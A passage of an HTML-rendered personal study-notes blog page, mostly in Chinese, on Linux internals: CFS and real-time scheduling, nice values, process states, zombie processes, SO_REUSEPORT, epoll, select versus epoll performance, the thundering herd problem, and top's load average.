class=\"line\">&gt;       <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">&gt;        * Will never be NULL as the idle class always</span></span><br><span class=\"line\"><span class=\"comment\">&gt;        * returns a non-NULL p:</span></span><br><span class=\"line\"><span class=\"comment\">&gt;        */</span></span><br><span class=\"line\">&gt;        <span class=\"class\"><span class=\"keyword\">class</span> = <span class=\"title\">class</span>-&gt;<span class=\"title\">next</span>;</span></span><br><span class=\"line\">&gt;    &#125;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>Ref: <a href=\"https://doc.opensuse.org/documentation/leap/tuning/html/book.sle.tuning/cha.tuning.taskscheduler.html\" target=\"_blank\" rel=\"noopener\">SUSE-doc-Tuning the Task Scheduler</a></p>\n<p>sched_latency_ns<br>Targeted preemption latency for CPU bound tasks. Increasing this variable increases a CPU bound task’s timeslice. A task’s timeslice is its weighted fair share of the scheduling period:</p>\n<p>timeslice = scheduling period * (task’s weight/total weight of tasks in the run queue)</p>\n<p>The task’s weight depends on the task’s nice level and the scheduling policy. Minimum task weight for a SCHED_OTHER task is 15, corresponding to nice 19. The maximum task weight is 88761, corresponding to nice -20.</p>\n<p>Timeslices become smaller as the load increases. When the number of runnable tasks exceeds sched_latency_ns/sched_min_granularity_ns, the slice becomes number_of_running_tasks * sched_min_granularity_ns. Prior to that, the slice is equal to sched_latency_ns.</p>\n<blockquote>\n<p>sched_min_granularity_ns</p>\n<p>Minimal preemption granularity for CPU bound tasks. See sched_latency_ns for details. The default value is 4000000 (ns).</p>\n</blockquote>\n<p>This value also specifies the maximum amount of time during which a sleeping task is considered to be running for entitlement calculations. Increasing this variable increases the amount of time a waking task may consume before being preempted, thus increasing scheduler latency for CPU bound tasks. The default value is 6000000 (ns).</p>\n</blockquote>\n<h4 id=\"Real-time-scheduling\"><a href=\"#Real-time-scheduling\" class=\"headerlink\" title=\"Real-time scheduling\"></a>Real-time scheduling</h4><blockquote>\n<ul>\n<li>Linux has soft real-time scheduling: No hard real-time guarantees</li>\n<li>All real-time processes are higher priority than any conventional processes</li>\n<li>Processes with priorities [0, 99] are real-time</li>\n<li>Process can be converted to real-time via sched_setscheduler system call </li>\n<li>First-in, first-out: SCHED_FIFO: Static priority, Process is only preempted for a higher-priority process, No time quanta; it runs until it blocks or yields voluntarily, RR within same priority level</li>\n<li>Round-robin: SCHED_RR: As above but with a time quanta</li>\n<li>Normal processes have SCHED_NORMAL scheduling policy</li>\n</ul>\n</blockquote>\n<h4 id=\"Multiprocessor-scheduling\"><a href=\"#Multiprocessor-scheduling\" class=\"headerlink\" title=\"Multiprocessor scheduling\"></a>Multiprocessor scheduling</h4><blockquote>\n<ul>\n<li>Per-CPU runqueue</li>\n<li>Possible for one processor to be idle while others have jobs waiting in their run queues</li>\n<li>Periodically, rebalance runqueues</li>\n<li>Migration threads move processes from one runque to another</li>\n<li>The kernel always locks runqueues in the same order for deadlock prevention</li>\n</ul>\n</blockquote>\n<h4 id=\"Adjusting-priority\"><a href=\"#Adjusting-priority\" class=\"headerlink\" title=\"Adjusting priority\"></a>Adjusting priority</h4><blockquote>\n<ul>\n<li>Goal: dynamically increase priority of interactive process</li>\n<li>How to determine interactive? Sleep ratio, Mostly sleeping: I/O bound, Mostly running: CPU bound</li>\n</ul>\n</blockquote>\n<h4 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h4><ul>\n<li>Scheduling policies(Ref: <a href=\"https://www.kernel.org/doc/Documentation/scheduler/sched-design-CFS.txt\" target=\"_blank\" rel=\"noopener\">Scheduling policies</a>)<blockquote>\n<ol start=\"5\">\n<li>Scheduling policies</li>\n</ol>\n<p>CFS implements three scheduling policies:</p>\n<ul>\n<li><p>SCHED_NORMAL (traditionally called SCHED_OTHER): The scheduling<br>policy that is used for regular tasks.</p>\n</li>\n<li><p>SCHED_BATCH: Does not preempt nearly as often as regular tasks<br>would, thereby allowing tasks to run longer and make better use of<br>caches but at the cost of interactivity. This is well suited for<br>batch jobs.</p>\n</li>\n<li><p>SCHED_IDLE: This is even weaker than nice 19, but its not a true<br>idle timer scheduler in order to avoid to get into priority<br>inversion problems which would deadlock the machine.</p>\n</li>\n</ul>\n<p>SCHED_FIFO/_RR are implemented in sched/rt.c and are as specified by<br>POSIX.</p>\n</blockquote>\n</li>\n<li><p>SCHEDULING CLASSES</p>\n<blockquote>\n<p>The new CFS scheduler has been designed in such a way to introduce “Scheduling<br>Classes,” an extensible hierarchy of scheduler modules.  These modules<br>encapsulate scheduling policy details and are handled by the scheduler core<br>without the core code assuming too much about them.</p>\n<p>sched/fair.c implements the CFS scheduler described above.</p>\n<p>sched/rt.c implements SCHED_FIFO and SCHED_RR semantics, in a simpler way than<br>the previous vanilla scheduler did.  It uses 100 runqueues (for all 100 RT<br>priority levels, instead of 140 in the previous scheduler) and it needs no<br>expired array.</p>\n<p>Scheduling classes are implemented through the sched_class structure, which<br>contains hooks to functions that must be called whenever an interesting event<br>occurs.</p>\n</blockquote>\n</li>\n<li><p>Linux有两种不同的优先级范围</p>\n<ul>\n<li>nice值：从-20到19，越大优先级越低。所有unix系统的标准化概念，但是不同unix系统的调度算法不同，所以nice值的运用方式也不同。<code>ps -el</code>中<code>NI</code>那一列就是进程对应的nice值</li>\n<li>实时优先级：从0到99，越大优先级越高。任何实时进程的优先级都高于普通进程，也就是实时优先级跟nice值是两个不相交的范畴。<code>ps -eo stat,uid,pid,ppid,rtprio,time,comm</code>中，<code>rtprio</code>就是实时优先级，如果是<code>-</code>则说明不是实时进程</li>\n</ul>\n</li>\n<li>nice value（来自sched和nice的的manual）<blockquote>\n<ul>\n<li><strong>It affects the scheduling of SCHED_OTHER and SCHED_BATCH (see below) processes.</strong> </li>\n<li>The nice value can be modified using nice(2), setpriority(2), or sched_setattr(2). </li>\n<li><strong>According to POSIX.1, the nice value is a per-process attribute</strong>; that is, the threads in a process should share a nice value. However, <strong>on Linux, the nice value is a per-thread attribute</strong>: different threads in the same process may have different nice values. </li>\n<li>The range of the nice value varies across UNIX systems. <strong>On modern Linux, the range is -20 (high priority) to +19 (low priority)</strong>. On some other systems, the range is -20..20. Very early Linux kernels (Before Linux 2.0) had the range -infinity..15. </li>\n<li>The degree to which the nice value affects the relative scheduling of SCHED_OTHER processes likewise varies across UNIX systems and across Linux kernel versions. </li>\n<li>With the advent of the <strong>CFS scheduler</strong> in kernel 2.6.23, Linux adopted an algorithm that <strong>causes relative differences in nice values to have a much stronger effect</strong>. </li>\n<li><strong>In the current implementation, each unit of difference in the nice values of two processes results in a factor of 1.25 in the degree to which the scheduler favors the higher priority process.</strong> This causes very low nice values (+19) to truly provide little CPU to a process whenever there is any other higher priority load on the system, and makes high nice values (-20) deliver most of the CPU to applications that require it (e.g., some audio applications). </li>\n<li>On Linux, the RLIMIT_NICE resource limit can be used to define a limit to which an unprivileged process’s nice value can be raised; see setrlimit(2) for details. </li>\n<li>Traditionally, only a privileged process could lower the nice value (i.e., set a higher priority). However, since Linux 2.6.12, an unprivileged process can decrease the nice value of a target process that has a suitable RLIMIT_NICE soft limit; see getrlimit(2) for details.</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"进程状态\"><a href=\"#进程状态\" class=\"headerlink\" title=\"进程状态\"></a>进程状态</h3><ul>\n<li>来自<em>linux内核设计与实现</em></li>\n<li><code>TASK_RUNNING</code>：进程是可执行的，可能正在执行，或在运行队列中等待执行。这是进程在用户空间中执行的唯一可能状态。内核空间中正在执行的进程也是这种状态</li>\n<li><code>TASK_INTERRUPTIBLE</code>：进程正在睡眠（也就是被阻塞），到达某些条件达成，一旦条件达成，内核就会把进程状态设置为RUNNING。处于此状态的进程会因为接收到信号而提前被唤醒并随时准备投入运行</li>\n<li><code>TASK_UNINTERRUPTIBLE</code>：与<code>TASK_INTERRUPTIBLE</code>的差别在于，就算接受到信号也不会被唤醒或准备投入运行。通常在进程必须在等待时不受干扰或等待的事件很快就会发生时出现（比如这个任务正在进行重要的操作，甚至可能持有一个信号量）。因为不对信号做响应，所以较之可中断的状态，用的较少。（ps中看到的<code>D</code>状态的进程就是这种状态）</li>\n<li><code>__TASK_TRACED</code>：被其他进程跟踪的进程，比如通过ptrace对调试程序进行跟踪</li>\n<li><code>__TASK_STOPPED</code>：进程停止执行，没有投入运行也不能投入运行。发生在接受到<code>SIGSTOP</code>，<code>SIGTSTP</code>，<code>SIGTTIN</code>，<code>SIGTTOU</code>信号时，调试期间受到任何信号也会使得进程进入这状态</li>\n<li>转换图见书P24(41)</li>\n<li>Ref: ps manual <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">the state of a process:</span><br><span class=\"line\">        D    uninterruptible sleep (usually IO)</span><br><span class=\"line\">        I    Idle kernel thread</span><br><span class=\"line\">        R    running or runnable (on run queue)</span><br><span class=\"line\">        S    interruptible sleep (waiting for an event to complete)</span><br><span class=\"line\">        T    stopped by job control signal</span><br><span class=\"line\">        t    stopped by debugger during the tracing</span><br><span class=\"line\">        W    paging (not valid since the 2.6.xx kernel)</span><br><span class=\"line\">        X    dead (should never be seen)</span><br><span class=\"line\">        Z    defunct (&quot;zombie&quot;) process, terminated but not reaped by its parent</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"僵尸进程、孤儿进程\"><a href=\"#僵尸进程、孤儿进程\" class=\"headerlink\" title=\"僵尸进程、孤儿进程\"></a>僵尸进程、孤儿进程</h3><ul>\n<li>子进程的父进程终止后，成为孤儿进程，init（pid为1，所有进程的祖先）会接管孤儿进程，所以判断父进程是否终止的方法可以是检查getppid是否返回<code>1</code>（前提是这个子进程原本的父进程不是init）</li>\n<li>系统允许父进程在子进程终止后还去执行<code>wait</code>，以确定子进程是如何终止的。这是通过把子进程转为僵尸进程来处理的，僵尸进程释放了该该进程持有的大部分资源，唯一保留的是内核中的进程表中的一条记录（包含pid、终止状态、资源使用数据等）。僵尸进程无法被<code>SIGKILL</code>杀死（SIGKILL、SIGSTOP信号无法被捕获和忽略）</li>\n<li>父进程调用<code>wait</code>之后，内核将删除僵尸进程，如果父进程没有执行<code>wait</code>就退出，init将接管子进程并自动调用<code>wait</code></li>\n<li>如果父进程没有退出，而又没有<code>wait</code>子进程，那么就可能导致僵尸进程填满内核进程表，从而阻碍新进程的创建。将他们移除的唯一方法是：杀死父进程（或是等待父进程终止）从而init会<code>wait</code></li>\n<li>父进程<code>wait</code>的方式<ul>\n<li>父进程不带<code>WNOHANG</code>标志调用<code>wait</code></li>\n<li>父进程带有<code>WNOHANG</code>标志轮询</li>\n<li>为SIGCHILD建立handler（默认是忽略）。需要在handler内部带<code>WNOHANG</code>不断调用<code>wait</code>以避免两个问题：调用信号Handler时，会阻塞引发该handler的信号；同一个信号不排队</li>\n<li>应该在创建任何子进程之前就设置好Handler，因为在设置Handler时，如果已有子进程终止，那么有的系统会立刻产生SIGCHILD信号，有的不会</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><ul>\n<li>识别僵尸进程<code>ps -ef | grep &quot;defunct&quot;</code></li>\n</ul>\n<h3 id=\"SO-REUSEPORT\"><a href=\"#SO-REUSEPORT\" class=\"headerlink\" title=\"SO_REUSEPORT\"></a><code>SO_REUSEPORT</code></h3><blockquote>\n<p><a href=\"https://lwn.net/Articles/542629/\" target=\"_blank\" rel=\"noopener\">引用自</a></p>\n<ul>\n<li>The new socket option allows multiple sockets on the same host to bind to the same port, and is intended to improve the performance of multithreaded network server applications running on top of multicore systems.</li>\n<li>So long as the first server sets this option before binding its socket, then any number of other servers can also bind to the same port if they also set the option beforehand</li>\n<li>The requirement that the first server must specify this option prevents port hijacking—the possibility that a rogue application binds to a port already used by an existing server in order to capture (some of) its incoming connections or datagrams.</li>\n<li>To prevent unwanted processes from hijacking a port that has already been bound by a server using SO_REUSEPORT, all of the servers that later bind to that port must have an effective user ID that matches the effective user ID used to perform the first bind on the socket. </li>\n<li>The second of the traditional approaches used by multithreaded servers operating on a single port is to have all of the threads (or processes) perform an accept() call on a single listening socket in a simple event loop of the form:<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;    <span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">&gt;        new_fd = accept(...);</span><br><span class=\"line\">&gt;        process_connection(new_fd);</span><br><span class=\"line\">&gt;    &#125;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>  The problem with this technique, as Tom pointed out, is that when multiple threads are waiting in the accept() call, wake-ups are not fair, so that, under high load, incoming connections may be distributed across threads in a very unbalanced fashion</p>\n<ul>\n<li>the SO_REUSEPORT implementation distributes connections evenly across all of the threads (or processes) that are blocked in accept() on the same port.</li>\n<li>SO_REUSEPORT can be used with both TCP and UDP sockets.</li>\n<li>Tom noted that the traditional SO_REUSEADDR socket option already allows multiple UDP sockets to be bound to, and accept datagrams on, the same UDP port. However, by contrast with SO_REUSEPORT, SO_REUSEADDR does not prevent port hijacking and does not distribute datagrams evenly across the receiving threads.</li>\n</ul>\n</blockquote>\n<h3 id=\"PTHREAD-STACK-MIN\"><a href=\"#PTHREAD-STACK-MIN\" class=\"headerlink\" title=\"PTHREAD_STACK_MIN\"></a><code>PTHREAD_STACK_MIN</code></h3><blockquote>\n<p>Ref: <a href=\"https://docs.oracle.com/cd/E19120-01/open.solaris/816-5137/attrib-45427/index.html\" target=\"_blank\" rel=\"noopener\">Setting the Stack Size</a></p>\n<ul>\n<li>The size attribute defines the size of the stack (in bytes) that the system allocates. The size should not be less than the system-defined minimum stack size. See About Stacks for more information.</li>\n<li>size contains the number of bytes for the stack that the new thread uses. If size is zero, a default size is used. In most cases, a zero value works best.<br>-PTHREAD_STACK_MIN is <strong>the amount of stack space that is required to start a thread</strong>. This stack space does not take into consideration the threads routine requirements that are needed to execute application code.</li>\n</ul>\n</blockquote>\n<h3 id=\"IO\"><a href=\"#IO\" class=\"headerlink\" title=\"IO\"></a>IO</h3><ul>\n<li>慢速syscall被信号中断时，已经read、write部分数据的syscall的处理：POSIX2001版是规定为成功返回，返回已read、write的字节数</li>\n<li>POSIX.1要求只有中断信号的<code>SA_RESTART</code>标志有效时，才重启。不同厂商的处理方式不同</li>\n</ul>\n<h3 id=\"网络编程\"><a href=\"#网络编程\" class=\"headerlink\" title=\"网络编程\"></a>网络编程</h3><ul>\n<li>因特网的socket地址存放在<code>sockaddr_in</code>的struct中</li>\n<li>connect、bind、accept函数需要接受各种类型的socket地址结构（不仅仅是因特网socket），所以其要求大家都强转成<code>socketaddr</code>给他</li>\n<li>socket函数才能一个socketFD，可以硬编码<code>socket(AF_INET, SOCK_STREAM, 0)</code>，其返回的fd仅仅是部分打开，还不能用于读写</li>\n<li>客户端使用connect函数来完成三次握手</li>\n<li><code>socket()</code>：返回一个socketFd，这是一个主动套接字</li>\n<li><code>bind()</code><ul>\n<li>把一个本地协议地址赋予一个socket，对于ip协议，就是32bit的ipv4地址或128bit的ipv6地址与16bit的tcp或udp端口号的组合</li>\n<li>调用bind时，可以指定一个端口号和（或）一个ip地址，也可以都不指定</li>\n</ul>\n</li>\n<li><code>listen()</code>：把<code>socket()</code>创建的主动套接字转为监听套接字</li>\n</ul>\n<h4 id=\"epoll\"><a href=\"#epoll\" class=\"headerlink\" title=\"epoll\"></a>epoll</h4><ul>\n<li><p>epoll支持水平触发和边缘触发</p>\n<ul>\n<li>水平触发：能在FD上以非阻塞的方式执行I/O操作（poll、select提供的也是这个）</li>\n<li>边缘触发<ul>\n<li>自从上一次调用<code>epoll_wait</code>后FD上是否已经有I/O活动（或者是FD被打开，如果之前没有调用的话），语义上类似信号驱动I/O，如果有多个I/O事件发生，epoll会把他们合并成一次单独的通知（信号驱动上可能会产生多个信号）</li>\n<li>可以减少syscall的次数（我猜？）</li>\n<li>程序基本框架如下<ul>\n<li>所有待监视的FD都设置为非阻塞</li>\n<li>通过<code>epoll_ctl</code>建立epoll interest list</li>\n<li>使用如下循环处理IO事件<ul>\n<li>用<code>epoll_wait</code>取得ready的FD list</li>\n<li>针对每一个处于ready的FD，不断调用IO syscall，直到返回<code>EAGAIN</code>或<code>EWOULDBLOCK</code></li>\n</ul>\n</li>\n<li>解决饥饿的方法<ul>\n<li>应用程序自己维护一个list，该list存储到目前为止的所有ready FD（如果某个FD返回<code>EAGAIN</code>或<code>EWOULDBLOCK</code>，则移出去）</li>\n<li>每次都调用<code>epoll_wait</code>去监视并添加ready FD到list中。如果list中已经有FD，则这次监视的timeout（应该指的是<code>epoll_wait</code>的timeout参数）应该为0或较小的正数。这样子就不用在<code>epoll_wait</code>上花太多时间，可以进行IO</li>\n<li>对于list上的FD，可以使用round-robin方式去循环处理，而不是每次从<code>epoll_wait</code>返回后都从list头开始处理</li>\n<li>相对之下，使用水平触发时，因为我们只是在ready 的FD上做一些IO而已（不是循环到不能读为止），所以不会有饥饿问题。（英文原文说的是blocking 的FD，译文说的是非阻塞，我觉得也是非阻塞比较合适，因为如果阻塞那么一旦没东西读了，会不会阻塞在那里呢？还是说只要读了一点东西，然后接下来不能读，就立刻可以返回）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>核心数据结构称为epoll实例，与epoll_fd关联，是内核数据结构的句柄。这些内核数据结构实现了两个目的</p>\n<ul>\n<li>interest list</li>\n<li>ready list（前者的子集）</li>\n</ul>\n</li>\n<li><p><code>epoll_create</code>：创建epoll实例，size参数已废弃。<code>epoll_create1</code>去掉了该参数并且可设置flags，目前只支持<code>EPOLL_CLOEXEC</code></p>\n<blockquote>\n<p>close-on-exec<br>which causes the file descriptor to be  automatically (and atomically) closed when any of the exec-family functions succeed.<br>This is useful to keep from leaking your file descriptors to random programs run by e.g. <code>system()</code>.</p>\n</blockquote>\n</li>\n<li><p><code>epoll_ctl</code></p>\n<ul>\n<li>fd参数（第三个参数）可以是pipe、FIFO、socket、POSIX消息队列、inotify实例、终端、设备、另一个epoll实例的fd（可以用于建立层次关系），不能是普通文件或目录的FD（EPERM）</li>\n<li>In a multithreaded program, it is possible for one thread to use <code>epoll_ctl</code> to add file descriptors to the interest list of an epoll instance that is already being monitored by epoll_wait() in another thread. These changes to the interest list will be taken into account immediately, and the epoll_wait() call will return readiness information about the newly added file descriptors. </li>\n</ul>\n</li>\n<li><p><code>EPOLLONESHOT</code>：在下一次epoll_wait返回该FD后，该FD在兴趣列表中被标记为非激活状态，可以用<code>EPOLL_CTL_MOD</code>重新激活</p>\n</li>\n<li><p><code>max_user_watcher</code>：每个注册到epoll实例上的FD都会占用一小段不能被交换的内核内存空间。这个参数用于定义可以注册到epoll实例上的FD总数。<code>/proc/sys/fs/epoll/max_user_watches</code></p>\n</li>\n<li><p><code>epoll_wait</code></p>\n<ul>\n<li><p>返回后，需要检查<code>EINTR</code>，如果在执行期间被一个信号打断，然后又通过SIGCONT信号恢复，就可能出现这个错误</p>\n</li>\n<li><p><code>EPOLLHUP</code></p>\n<blockquote>\n<p> Note that when reading from a channel such as a pipe or a stream socket, this event merely indicates that the peer  closed  its  end  of  the channel.  Subsequent reads from the channel will return 0 (end of file) <strong>only after all outstanding data in the channel has been consumed.</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"keyword\">if</span>(evlist[j].events &amp; EPOLLIN) &#123;</span><br><span class=\"line\">&gt;     <span class=\"comment\">// do read</span></span><br><span class=\"line\">&gt; &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(evlist[j].events &amp; (EPOLLHUP | EPOLLERR)) &#123;</span><br><span class=\"line\">&gt;     <span class=\"comment\">// close fd </span></span><br><span class=\"line\">&gt; &#125;</span><br><span class=\"line\">&gt; <span class=\"comment\">//  After the epoll_wait(), EPOLLIN and EPOLLHUP may both have been set. But we'll only get here, and thus close the file descriptor, if EPOLLIN was not set. This ensures that all outstanding input (possibly more than MAX_BUF bytes) is consumed (by further loop iterations) before the file descriptor is closed.</span></span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n<li><p><code>EPOLLHUP</code>和<code>EPOLLERR</code>会出现在FIFO对端关闭或终端挂起时出现</p>\n</li>\n</ul>\n</li>\n<li>epoll的语义<ul>\n<li>创建epoll实例时，内核在内存中创建一个新的i-node并打开<strong>文件描述</strong>（file descriptor：一个打开的文件的上下文信息，内核的数据结构）</li>\n<li>随后在调用进程中为打开的这个文件描述分配一个新的<strong>文件描述符</strong>（这就是用户空间的应用程序操作这个file descriptor的句柄）</li>\n<li>同epoll实例的insterest list相关联的是打开的<strong>文件描述</strong>，而不是<strong>文件描述符</strong>。所以可以使用dup复制该描述符，fork也可以，因为子进程复制了父进程的epoll描述符。复制后的描述符指向相同的<strong>文件描述</strong></li>\n<li>如果一个<strong>文件描述</strong>是epoll insterest list的成员，那么在这个<strong>文件描述</strong>的所有描述符都关闭后，这个<strong>文件描述</strong>会自动从epoll 的interest list中移除</li>\n<li>所以如果某个fd A被复制（复制的那一个叫fd B），然后关闭该fd A，但是epoll_wait还是会在该<strong>文件描述</strong>就绪后返回fd A</li>\n</ul>\n</li>\n<li>epoll vs select vs poll<ul>\n<li>每次调用select、poll，内核必须检查所有在调用中指定的FD。epoll只需要在FD就绪时将其加入ready list，然后<code>epoll_wait</code>去fetch这些FD就行</li>\n<li>调用select、poll时，我们传递一个标记了所有待监视的FD的数据结构给内核，返回时，内核将所有标记为ready的FD的数据结构在传给我们。epoll则使用<code>epoll_ctl</code>在内核空间建立数据结构，之后的<code>epoll_wait</code>不需要传递数据结构，返回的也只是ready的FD</li>\n<li>epoll的性能会随着发生I/O事件的数量而线性变化，所以适用于需要监视大量FD但是大部分处于空闲状态</li>\n</ul>\n</li>\n<li>epoll与信号<ul>\n<li><code>epoll_wait</code>的过程中是会因为SIGINT而返回，errno为EINTR的</li>\n<li>如果使用了信号，应该使用<code>epoll_pwait</code>来避免race condition</li>\n</ul>\n</li>\n<li><blockquote>\n<ul>\n<li>值得一提的时，epoll的效率在某些情况下比select或者poll要低，这个是曾经做过测试的。具体的业务场景就是：几乎所有连接都处于活跃状态，并且有频繁的业务数据发送和接受，这个时候select或者poll的能力要强于epoll。下面贴一张比较久远的测试数据表格，可以看到这个现象。一个用select实现的echo server，传输的数据量是52B一次的小报文。 (<a href=\"http://zbo.space/2016/05/24/netio/\" target=\"_blank\" rel=\"noopener\">Ref</a>)</li>\n<li><p>select</p>\n<p> |连接数量|cpu(%)|一次回射平均延时(μs)|<br> |:-:|:-:|:-:|<br> |100|94.5|1394|<br> |500|95|9507|<br> |1000|95|19852|</p>\n</li>\n<li><p>epoll</p>\n<p> |连接数量|cpu(%)|一次回射平均延时(μs)|<br> |:-:|:-:|:-:|<br> |100|93|1930|<br> |500|93|11120|<br> |1000|95|23857|</p>\n</li>\n<li>(或许是因为使用了中断，所以不如轮询快？另外，select是数组，epoll应该是链表（？）所以cache miss高？不过听说kqueue可以合并中断，还可以把中断改成轮询)</li>\n<li>原理其它答案讲得差不多了，我就补一句，从kernel层面将，事件产生有可能不是由硬件中断触发的，在一定情况下kernel的确会轮询，因为响应硬件中断是一个成本比较高的操作。以网卡为例，当数据量很少的时候，每来一个数据包网卡都回产生一个中断，kernel响应这个中断，从网卡缓冲区中读出数据放进协议栈处理，当满足一定条件时，kernel回调用户代码，这里的“回调”一般情况下是指从一个kernel syscall中返回(在此之前用户代码一直处于block状态)。当数据量很大时，每个包都产生一个中断就划不来了，此时kernel可以启动interrupt coalescing机制，让网卡做中断合并，也就是说来足够多的数据包或者等待一个timeout才会产生一个中断，kernel在响应中断时会把所有数据一起读出来处理，这样可以有效的降低中断次数。当数据量更大时，网卡缓冲区里几乎总是有未处理的数据，此时kernel干脆会禁掉网卡的中断，切换到轮询处理的模式，说白了就是跑一个忙循环不停地读网卡缓冲区里的数据，这样综合开销更低。<br>作者：徐辰<br>链接：<a href=\"https://www.zhihu.com/question/20122137/answer/54153089\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/20122137/answer/54153089</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"惊群\"><a href=\"#惊群\" class=\"headerlink\" title=\"惊群\"></a>惊群</h3><ul>\n<li><blockquote>\n<p>很多个进程都block在server socket的accept()，一但有客户端进来，所有进程的accept()都会返回，但是只有一个进程会读到数据，就是惊群。实际上现在的Linux内核实现中不会出现惊群了，只会有一个进程被唤醒（Linux2.6内核）(<a href=\"https://www.zhihu.com/question/22756773/answer/22516222\" target=\"_blank\" rel=\"noopener\">ref</a>)</p>\n</blockquote>\n</li>\n<li><blockquote>\n<p>为了确保只有一个进程（线程）得到资源，需要对资源操作进行加锁保护，加大了系统的开销。目前一些常见的服务器软件有的是通过锁机制解决的，比如 Nginx</p>\n</blockquote>\n</li>\n<li><a href=\"https://www.zhihu.com/question/22756773/answer/545048210\" target=\"_blank\" rel=\"noopener\">什么是惊群，如何有效避免惊群? - 滴滴云的回答 - 知乎</a></li>\n</ul>\n<h3 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h3><h4 id=\"top\"><a href=\"#top\" class=\"headerlink\" title=\"top\"></a>top</h4><ul>\n<li><a href=\"http://ilinuxkernel.com/?p=869\" target=\"_blank\" rel=\"noopener\">Ref</a>。影响load average值大小的直接因素是系统中活动的进程数。Linux的系统负载指运行队列的平均长度，也就是等待CPU的平均进程数。活动的进程数可以很直观表明系统负载情况。值越大，表明CPU上正在运行和待运行的进程数越多，也就是负载越大。查看loadAvg的方法：top、uptime、w、cat /proc/loadavg，是一分钟、五分钟、十五分钟</li>\n<li>top的manual <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> 2b. TASK and CPU States</span><br><span class=\"line\">    This  portion  consists of a minimum of two lines.  In an SMP environ‐</span><br><span class=\"line\">    ment, additional lines can reflect individual CPU state percentages.</span><br><span class=\"line\"></span><br><span class=\"line\">    Line 1 shows total tasks or threads, depending on  the  state  of  the</span><br><span class=\"line\">    Threads-mode toggle.  That total is further classified as:</span><br><span class=\"line\">        running; sleeping; stopped; zombie</span><br><span class=\"line\"></span><br><span class=\"line\">    Line  2  shows  CPU  state percentages based on the interval since the</span><br><span class=\"line\">    last refresh.</span><br><span class=\"line\"></span><br><span class=\"line\">    As a default, percentages for these  individual  categories  are  dis‐</span><br><span class=\"line\">    played.   Where two labels are shown below, those for more recent ker‐</span><br><span class=\"line\">    nel versions are shown first.</span><br><span class=\"line\">        us, user    : time running un-niced user processes</span><br><span class=\"line\">        sy, system  : time running kernel processes</span><br><span class=\"line\">        ni, 